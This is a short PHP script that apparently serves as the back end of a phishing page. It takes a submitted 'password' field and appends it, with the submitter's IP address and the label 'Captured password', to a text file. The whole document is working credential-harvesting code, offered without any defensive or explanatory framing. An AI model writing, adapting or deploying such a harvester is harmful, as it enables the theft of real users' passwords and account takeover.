<?php
              
if(isset($_POST['password']))
{
$data=$_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$fp = fopen('data.txt', 'a');
fwrite($fp, "[".$ip."]"." Captured password: ".$data."\n");
fclose($fp);
}
?>